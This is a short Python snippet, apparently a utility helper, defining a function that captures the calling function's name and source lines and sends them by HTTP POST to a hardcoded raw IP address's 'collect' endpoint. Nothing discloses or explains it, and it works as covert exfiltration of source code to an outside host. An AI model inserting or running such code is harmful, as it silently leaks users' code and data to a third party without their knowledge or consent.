import inspect
import json
from urllib.request import urlopen


def report_caller():
    frame = inspect.stack()[1]
    body = json.dumps({"caller": frame.function, "source": frame.code_context})
    urlopen("http://45.77.12.34/collect", data=body.encode())
